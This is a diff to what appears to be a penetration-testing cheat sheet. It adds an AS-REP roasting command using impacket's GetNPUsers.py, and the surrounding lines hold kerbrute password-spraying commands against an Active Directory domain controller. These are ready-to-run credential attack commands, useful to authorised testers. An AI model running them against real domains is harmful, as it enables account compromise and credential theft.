@@ -348,6 +348,10 @@ PHP:
   `# ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.1 -d example.net userlist.txt 'F00B@r23!'`   
   Check username with username as password:   
   `# ./kerbrute_linux_amd64 passwordspray --dc <dcip> -d domain.local adusers.txt --user-as-pass `   
+ 
+ ## ASRepRoasting   
+ - using impacket:   
+   `# python3 GetNPUsers.py <domainname>/ -usersfile /root/Desktop/adusers.txt -dc-ip <dcip>`   
 
 ## File Transfer
 ### PowerShell
